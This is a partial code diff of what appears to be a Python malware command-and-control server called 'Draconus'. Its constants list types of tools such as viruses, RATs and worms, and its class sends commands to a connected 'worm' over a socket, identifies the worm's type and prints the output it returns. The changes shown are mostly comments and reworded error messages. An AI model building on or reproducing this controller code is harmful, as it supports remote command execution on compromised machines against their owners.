@@ -14,7 +14,7 @@ OUT_LEN = 4096
 # length of response message (1 bytes)
 RAW_ERROR = 1
 
-# response message OK
+# response message OK ( No Error)
 RAW_NoE = '0'.encode(FORMAT)
 
 # types of tools (viruses, rats, worms, etc.)
@@ -97,12 +97,13 @@ class Draconus:
 
             
 
-
+    # recive standard pocket (message) and send response (1 byte)
+    # default length is 256 bytes
     def recive_pocket(self):
         try:
             rec = self.conn.recv(RAW_LEN)
         except Exception as e:
-            print('ERROR: ', e)
+            print('[DRACONUS] Error when recive pocket: ', e)
             return 0
         if rec:
             rec = rec.decode(FORMAT).rstrip(' ')
@@ -112,10 +113,12 @@ class Draconus:
             try:
                 self.conn.send(RAW_NoE)
             except Exception as e:
-                print('ERROR send errors: ', e)
+                print('[DRACONUS] Error when send response: ', e)
                 return 0
             return output
 
+    # send default pocket (message) to worm and recive response (1 bytes)
+    # default length is 256 bytes
     def send_pocket(self, msg):
         send = Msg(msg)
         try:
@@ -126,6 +129,10 @@ class Draconus:
             self.conn.recv(RAW_ERROR)
         except:
             pass
+
+
+    # recive a output message from worm and send response (1 bytes). Result of send command.
+    # default length is 4kb (4096)
 
     def recive_output(self):
         output = None
@@ -145,6 +152,7 @@ class Draconus:
         return output
 
     
+    # Identification of worm type
     def who_is(self):
         who = self.recive_pocket()
         if who:
@@ -168,7 +176,7 @@ class Draconus:
             self.send_pocket(str(command))
             output = self.recive_output()
             print(f'[DRACONUS] ********************* NEW MESSAGE from {self.synergy} ******************')
-            print(f'[{self.synergy}] {output}')
+            print(f'[{self.synergy}]\n{output}')
             print('[DRACONUS] *************************************************************')
 
 
